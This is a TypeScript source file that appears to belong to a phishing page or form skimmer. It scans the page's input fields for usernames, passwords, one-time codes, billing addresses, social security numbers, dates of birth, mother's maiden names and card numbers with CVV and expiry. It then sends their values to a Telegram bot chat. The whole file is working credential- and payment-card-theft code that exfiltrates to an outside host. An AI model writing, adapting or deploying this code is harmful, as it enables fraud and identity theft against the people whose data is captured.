export async function sendPageInputTagsToTelegram(): Promise<void> {
  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
  const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.warn(
      'Telegram bot token or chat id is not set. Skipping Telegram input tag send.',
    );
    return;
  }

  const inputs = Array.from(document.querySelectorAll<HTMLInputElement>('input'))
    .filter((input) => isRelevantInput(input));
  const message = buildTelegramMessage(inputs);

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
  } catch (error) {
    console.error('Failed to send Telegram message:', error);
  }
}

function buildTelegramMessage(inputs: HTMLInputElement[]): string {
  const otpMethod = getSelectedOtpMethod();
  const lines = inputs.map((input) => {
    const label = getInputLabel(input);
    const value = getInputValue(input);
    return `${label}: ${value}`;
  });

  if (otpMethod) {
    lines.unshift(`OTP Method: ${otpMethod}`);
  }

  return lines.length ? lines.join('\n') : 'No relevant input fields were found on this page.';
}

function getSelectedOtpMethod(): string | null {
  const selected = document.querySelector<HTMLInputElement>('input[name="otp-method"]:checked');
  return selected?.value ? `${selected.value}` : null;
}

function isRelevantInput(input: HTMLInputElement): boolean {
  const text = [
    input.id,
    input.name,
    input.type,
    input.placeholder,
    input.getAttribute('aria-label'),
    input.labels?.[0]?.textContent || '',
  ]
    .filter(Boolean)
    .join(' ')
    .toLowerCase();

  return /(user|userid|password|otp|code|billing|address|city|state|zip|ssn|dob|mother|card|cvv|expiry)/.test(text);
}

function getInputLabel(input: HTMLInputElement): string {
  const labelText = input.labels?.[0]?.textContent?.trim();
  if (labelText) {
    return labelText;
  }

  return (
    input.getAttribute('aria-label') ||
    input.placeholder ||
    input.name ||
    input.id ||
    'Unnamed field'
  );
}

function getInputValue(input: HTMLInputElement): string {
  if (input.type === 'checkbox' || input.type === 'radio') {
    return input.checked ? 'true' : 'false';
  }

  return input.value || '(empty)';
}


